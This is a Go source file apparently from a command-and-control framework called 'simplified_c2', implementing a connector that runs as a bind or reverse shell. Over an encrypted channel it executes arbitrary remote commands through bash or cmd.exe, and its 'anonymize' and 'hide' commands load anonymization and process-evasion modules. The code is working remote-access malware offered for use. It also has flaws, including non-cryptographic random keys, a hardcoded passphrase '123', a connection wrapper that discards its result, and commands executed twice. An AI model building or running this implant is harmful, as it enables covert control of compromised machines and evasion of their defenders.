package connector

import (
	"encoding/binary"
	"encoding/gob"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/simplified_c2/core/crypto"
	"github.com/simplified_c2/module"
	"github.com/simplified_c2/modules/evasion"
	"github.com/simplified_c2/modules/shell_anon"

	_ "embed"
)

type Protocol int

const (
	TCP Protocol = iota
	UDP
	HTTP
	HTTPS
	DNS
)

type ConnectorType int

const (
	BindShell ConnectorType = iota
	ReverseShell
)

type SecurityConfig interface {
	SecureNetwork(conn io.ReadWriter) io.ReadWriter
}

type ConnectorConfig struct {
	Type           ConnectorType
	Protocol       Protocol
	Host           string
	Port           int
	Secure         bool
	SecurityConfig SecurityConfig
}

const (
	PROTOCOL_VERSION = 1
	MSG_HANDSHAKE    = 1
	MSG_COMMAND      = 2
	MSG_RESPONSE     = 3
	MSG_ERROR        = 255
	HANDSHAKE_OK     = 0
)

// Session represents a client session with secure key and IV
type Session struct {
	ID        string
	Key       *SecureBytes // Secure key storage
	IV        *SecureBytes // Secure IV storage
	CreatedAt time.Time
	Conn      net.Conn
}

type MessageHeader struct {
	Version    byte
	Type       byte
	PayloadLen uint32
}

type Connector struct {
	config       *ConnectorConfig
	listener     net.Listener
	connections  map[string]*Session // Map of active sessions
	mutex        sync.Mutex
	moduleSystem *module.ModuleSystem
	passphrase   []byte
}

//go:embed endpoint.pem
var publicKeyPEM []byte // RSA public key for handshake

func NewConnector(config *ConnectorConfig) *Connector {
	moduleSystem := module.NewModuleSystem()
	shellAnonModule := shell_anon.NewModule()
	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
		return shellAnonModule
	})
	evasionModule := evasion.NewModule()
	moduleSystem.Registry.RegisterModule("evasion", func() module.ModuleInterface {
		return evasionModule
	})

	return &Connector{
		config:       config,
		connections:  make(map[string]*Session),
		moduleSystem: moduleSystem,
		passphrase:   []byte("123"), // Used as fallback, replaced by session keys
	}
}

func (c *Connector) Start() error {
	switch c.config.Type {
	case BindShell:
		return c.startServer()
	case ReverseShell:
		return c.startClient()
	default:
		return fmt.Errorf("unsupported connector type: %v", c.config.Type)
	}
}

func (c *Connector) Stop() error {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	if c.listener != nil {
		if err := c.listener.Close(); err != nil {
			return fmt.Errorf("failed to close listener: %v", err)
		}
		c.listener = nil
	}
	for _, session := range c.connections {
		if session.Conn != nil {
			if err := session.Conn.Close(); err != nil {
				fmt.Printf("Failed to close session %s connection: %v\n", session.ID, err)
			}
		}
	}
	c.connections = make(map[string]*Session)
	return nil
}

func (c *Connector) startServer() error {
	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
	var err error
	c.listener, err = net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", addr, err)
	}
	fmt.Printf("C2 server listening on %s\n", addr)
	go func() {
		for {
			conn, err := c.listener.Accept()
			if err != nil {
				if strings.Contains(err.Error(), "use of closed network connection") {
					return
				}
				fmt.Printf("Error accepting connection: %v\n", err)
				continue
			}

			// Generate session data
			sessionID := generateSessionID()
			key := make([]byte, 32)
			iv := make([]byte, 16)
			rand.Read(key)
			rand.Read(iv)

			// Secure key and IV with SecureBytes
			secureKey := NewBytes(key)
			secureIV := NewBytes(iv)

			// Add tamper detection
			watcher := &Watcher{Name: "SessionWatcher"}
			secureKey.AddWatcher(watcher)
			secureIV.AddWatcher(watcher)

			// Store session
			session := &Session{
				ID:        sessionID,
				Key:       secureKey,
				IV:        secureIV,
				CreatedAt: time.Now(),
				Conn:      conn,
			}
			c.mutex.Lock()
			c.connections[sessionID] = session
			c.mutex.Unlock()

			// Start periodic key refresh
			secureKey.RefreshKeyPeriodically()
			secureIV.RefreshKeyPeriodically()

			if c.config.Secure && c.config.SecurityConfig != nil {
				conn = c.wrapConnection(conn)
			}

			// Perform handshake
			if err := c.performSessionHandshake(conn, session); err != nil {
				fmt.Printf("Handshake failed for session %s: %v\n", sessionID, err)
				conn.Close()
				c.mutex.Lock()
				delete(c.connections, sessionID)
				c.mutex.Unlock()
				continue
			}

			go c.handleConnection(conn, sessionID)
		}
	}()
	return nil
}

func (c *Connector) startClient() error {
	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
	var err error
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", addr, err)
	}

	// Generate session data
	sessionID := generateSessionID()
	key := make([]byte, 32)
	iv := make([]byte, 16)
	rand.Read(key)
	rand.Read(iv)

	// Secure key and IV with SecureBytes
	secureKey := NewBytes(key)
	secureIV := NewBytes(iv)

	// Add tamper detection
	watcher := &Watcher{Name: "SessionWatcher"}
	secureKey.AddWatcher(watcher)
	secureIV.AddWatcher(watcher)

	// Store session
	session := &Session{
		ID:        sessionID,
		Key:       secureKey,
		IV:        secureIV,
		CreatedAt: time.Now(),
		Conn:      conn,
	}
	c.mutex.Lock()
	c.connections[sessionID] = session
	c.mutex.Unlock()

	// Start periodic key refresh
	secureKey.RefreshKeyPeriodically()
	secureIV.RefreshKeyPeriodically()

	if c.config.Secure && c.config.SecurityConfig != nil {
		conn = c.wrapConnection(conn)
	}

	// Perform handshake
	if err := c.performSessionHandshake(conn, session); err != nil {
		conn.Close()
		c.mutex.Lock()
		delete(c.connections, sessionID)
		c.mutex.Unlock()
		return fmt.Errorf("handshake failed: %v", err)
	}

	go c.handleConnection(conn, sessionID)
	return nil
}

func (c *Connector) handleConnection(conn net.Conn, sessionID string) {
	defer func() {
		conn.Close()
		c.mutex.Lock()
		delete(c.connections, sessionID)
		c.mutex.Unlock()
		fmt.Printf("Session %s closed\n", sessionID)
	}()

	session, exists := c.connections[sessionID]
	if !exists {
		fmt.Printf("Session %s not found\n", sessionID)
		return
	}

	for {
		msgType, payload, err := c.receiveMessage(conn, session)
		if err != nil {
			if err != io.EOF {
				fmt.Printf("Error receiving message for session %s: %v\n", sessionID, err)
			}
			return
		}
		if msgType != MSG_COMMAND {
			c.sendMessage(conn, MSG_ERROR, []byte("expected command"), session)
			continue
		}
		command := string(payload)
		var response string
		if command == "exit" {
			fmt.Printf("Received exit command for session %s\n", sessionID)
			return
		}
		if command == "anonymize" {
			shellAnonModule, err := c.moduleSystem.Manager.LoadModule("shell_anon")
			if err != nil {
				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load shell_anon: %v", err)), session)
				continue
			}
			result, err := shellAnonModule.ExecuteCommand("setup", []string{})
			if err != nil {
				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("anonymize failed: %v", err)), session)
				continue
			}
			response = fmt.Sprintf("Anonymization applied: %v", result)
		} else {
			output, err := c.ExecuteCommand(command)
			if err != nil {
				response = fmt.Sprintf("Error: %v\n%s", err, output)
			} else {
				response = output
			}
		}
		if command == "hide" {
			if runtime.GOOS == "linux" {
				evasionModule, err := c.moduleSystem.Manager.LoadModule("evasion")
				if err != nil {
					c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load evasion: %v", err)), session)
					continue
				}
				result, err := evasionModule.ExecuteCommand("proc", []string{})
				if err != nil {
					c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("evasion: %v", err)), session)
					continue
				}
				response = fmt.Sprintf("evasion applied: %v", result)
			} else {
				response = fmt.Sprintf("You are running this on non-linux distribuition, you'll probably want injection module for this case (windows-base)")

			}

		} else {
			output, err := c.ExecuteCommand(command)
			if err != nil {
				response = fmt.Sprintf("Error: %v\n%s", err, output)
			} else {
				response = output
			}
		}

		c.sendMessage(conn, MSG_RESPONSE, []byte(response), session)
	}
}

func (c *Connector) performSessionHandshake(conn net.Conn, session *Session) error {
	encoder := gob.NewEncoder(conn)
	decoder := gob.NewDecoder(conn)

	// Send session ID and encrypted key/IV
	keyEnc, _ := crypto.RsaEnconding(publicKeyPEM, session.Key.Get())
	ivEnc, _ := crypto.RsaEnconding(publicKeyPEM, session.IV.Get())

	if err := encoder.Encode(session.ID); err != nil {
		return fmt.Errorf("failed to send session ID: %v", err)
	}
	if err := encoder.Encode(keyEnc); err != nil {
		return fmt.Errorf("failed to send encrypted key: %v", err)
	}
	if err := encoder.Encode(ivEnc); err != nil {
		return fmt.Errorf("failed to send encrypted IV: %v", err)
	}

	// Receive handshake response
	var response []byte
	if err := decoder.Decode(&response); err != nil {
		return fmt.Errorf("failed to receive handshake response: %v", err)
	}
	if len(response) < 1 || response[0] != HANDSHAKE_OK {
		return fmt.Errorf("invalid handshake response")
	}

	return nil
}

func (c *Connector) sendMessage(conn net.Conn, msgType byte, payload []byte, session *Session) error {
	encryptedPayload, err := crypto.AESEncrypt(payload, session.Key.Get())
	if err != nil {
		return fmt.Errorf("encryption failed: %v", err)
	}
	header := MessageHeader{
		Version:    PROTOCOL_VERSION,
		Type:       msgType,
		PayloadLen: uint32(len(encryptedPayload)),
	}
	if err := binary.Write(conn, binary.BigEndian, header.Version); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.Type); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.PayloadLen); err != nil {
		return err
	}
	_, err = conn.Write(encryptedPayload)
	return err
}

func (c *Connector) receiveMessage(conn net.Conn, session *Session) (byte, []byte, error) {
	var header MessageHeader
	if err := binary.Read(conn, binary.BigEndian, &header.Version); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.Type); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.PayloadLen); err != nil {
		return 0, nil, err
	}
	if header.Version != PROTOCOL_VERSION {
		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}
	encryptedPayload := make([]byte, header.PayloadLen)
	if _, err := io.ReadFull(conn, encryptedPayload); err != nil {
		return 0, nil, err
	}
	payload, err := crypto.AESDecrypt(encryptedPayload, session.Key.Get())
	if err != nil {
		return 0, nil, fmt.Errorf("decryption failed: %v", err)
	}
	return header.Type, payload, nil
}

func (c *Connector) wrapConnection(conn net.Conn) net.Conn {
	if c.config.SecurityConfig != nil {
		securedConn := c.config.SecurityConfig.SecureNetwork(conn)
		if securedConn != nil {
			return conn
		}
	}
	return conn
}

func (c *Connector) SendCommand(command string, sessionID string) (string, error) {
	c.mutex.Lock()
	session, exists := c.connections[sessionID]
	c.mutex.Unlock()
	if !exists {
		return "", fmt.Errorf("session %s not found", sessionID)
	}

	conn := session.Conn
	if conn == nil {
		return "", errors.New("no active connection")
	}

	err := c.sendMessage(conn, MSG_COMMAND, []byte(command), session)
	if err != nil {
		return "", fmt.Errorf("failed to send command: %v", err)
	}

	msgType, payload, err := c.receiveMessage(conn, session)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}
	if msgType == MSG_ERROR {
		return "", fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_RESPONSE {
		return "", fmt.Errorf("unexpected message type: %d", msgType)
	}
	return string(payload), nil
}

func (c *Connector) ExecuteCommand(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("/bin/bash", "-c", command)
	}
	if strings.HasPrefix(command, "cd ") {
		newDir := strings.TrimPrefix(command, "cd ")
		os.Chdir(newDir)
		path, _ := os.Getwd()
		output := []byte("current directory: " + path)
		return string(output), nil
	} else {
		output, err := cmd.CombinedOutput()
		if err != nil {
			return string(output), fmt.Errorf("command execution failed: %v", err)
		}
		return string(output), nil
	}
}

func generateSessionID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}
